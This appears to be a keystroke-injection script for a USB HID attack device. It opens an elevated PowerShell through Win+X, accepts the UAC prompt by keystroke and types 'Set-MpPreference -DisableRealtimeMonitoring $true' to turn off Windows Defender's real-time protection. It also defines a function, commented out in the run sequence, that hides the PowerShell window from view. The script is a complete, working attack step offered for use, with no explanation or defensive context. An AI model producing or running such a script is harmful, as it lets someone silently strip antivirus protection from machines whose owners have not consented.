function fast() {
  typingSpeed(0,0)
}
function startPS() {
	press("GUI x");
	delay(50);
	press("a");
	delay(300);
	press("LEFT");
	delay(50);
	press("ENTER");
	delay(200);
}
function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}
function disableAV() {
	type("Set-MpPreference -DisableRealtimeMonitoring $true")
	press("ENTER");
	delay(200);
}
function exitPS() {
	type("exit")
	press("ENTER");
}
layout('de');
fast();
startPS();
//hidePS();
disableAV();
exitPS();
